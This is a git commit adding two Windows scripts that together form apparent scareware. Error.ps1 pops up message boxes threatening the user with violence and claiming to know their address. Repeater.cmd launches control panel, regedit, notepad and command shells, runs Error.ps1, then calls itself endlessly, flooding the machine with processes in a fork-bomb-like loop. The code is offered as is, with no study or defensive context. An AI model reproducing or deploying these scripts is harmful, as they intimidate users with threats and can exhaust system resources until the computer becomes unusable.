ad8e101a850caa0650d0cf63f73104f027648883
LEMME SNIFF UR ASS <96000599+Micheal-Hunt@users.noreply.github.com>
2021-12-17 17:27:40 +0800

    Added the two core files to the repository.

---
+++ Error.ps1
@@ -0,0 +1,4 @@
+[Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
+[Windows.Forms.MessageBox]::show("Your fucked Your fucked Your fucked Your fucked Your fucked Your fucked Your fucked", "windows")
+[Windows.Forms.MessageBox]::show("I have a hitsquad already on their way, your going to die! (;", "The Hacker")
+[Windows.Forms.MessageBox]::show("i have your adress!", "The Hacker")
---
+++ Repeater.cmd
@@ -0,0 +1,9 @@
+@echo off
+start control.exe
+start notepad.exe
+start powershell start cmd
+start regedit.exe
+start splwow64.exe
+start cmd "Ive got you now."
+"%CD%\Error.ps1"
+"%CD%\Repeater.cmd"
